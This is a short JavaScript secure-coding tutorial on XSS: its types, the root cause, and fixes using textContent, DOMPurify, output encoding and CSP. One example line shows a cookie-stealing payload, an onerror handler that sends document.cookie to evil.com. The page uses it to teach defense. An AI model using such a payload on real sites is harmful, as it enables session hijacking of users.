---
title: "Input Sanitization & XSS"
category: "javascript"
chapterId: "js-security"
slug: "js-xss-sanitization"
description: "Sanitizing user inputs to counter modern XSS bypass vectors."
---

# Input Sanitization & XSS

## What is XSS?

Cross-Site Scripting (XSS) — an attacker injects malicious scripts into your page that execute in other users' browsers. They can steal cookies, tokens, keystrokes, or redirect users.

## Three types

| Type | How it works |
|---|---|
| **Stored** | Payload saved in DB, rendered for every visitor |
| **Reflected** | Payload in URL query param, reflected in page HTML |
| **DOM-based** | Payload processed by client-side JS (e.g., `innerHTML`) |

## The root cause

```js
// ❌ Vulnerable — inserting unsanitized user input into DOM
const comment = '<img src=x onerror="document.location='https://evil.com?c='+document.cookie">';
document.getElementById('output').innerHTML = comment; // executes!
```

## Fix 1 — use textContent instead of innerHTML

```js
// ✅ textContent escapes HTML — no execution possible
element.textContent = userInput;
```

## Fix 2 — sanitize before inserting HTML (when you need formatting)

```js
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href'],
});

element.innerHTML = clean; // safe
```

## Fix 3 — never trust URL params in JS

```js
// ❌ Vulnerable
const name = new URLSearchParams(location.search).get('name');
document.write(`Welcome ${name}`); // XSS if name = '<script>...'

// ✅ Safe
document.getElementById('greeting').textContent = `Welcome ${name}`;
```

## Fix 4 — output encoding on the server

In server-rendered HTML, escape `<`, `>`, `&`, `"`, `'` before inserting user data.

## Checklist

- ✅ Use `textContent` or `createElement` over `innerHTML`
- ✅ Sanitize with DOMPurify if you must render user HTML
- ✅ Set a strict CSP header
- ✅ Use framework defaults (React escapes by default)
- ✅ Validate and encode on the server before storing
- ✅ Never use `eval()`, `Function()`, or `setTimeout('string')`

> ⚠️ **Warning:** React's JSX escapes values automatically — but `dangerouslySetInnerHTML` bypasses this. Always sanitize content passed to `dangerouslySetInnerHTML`.
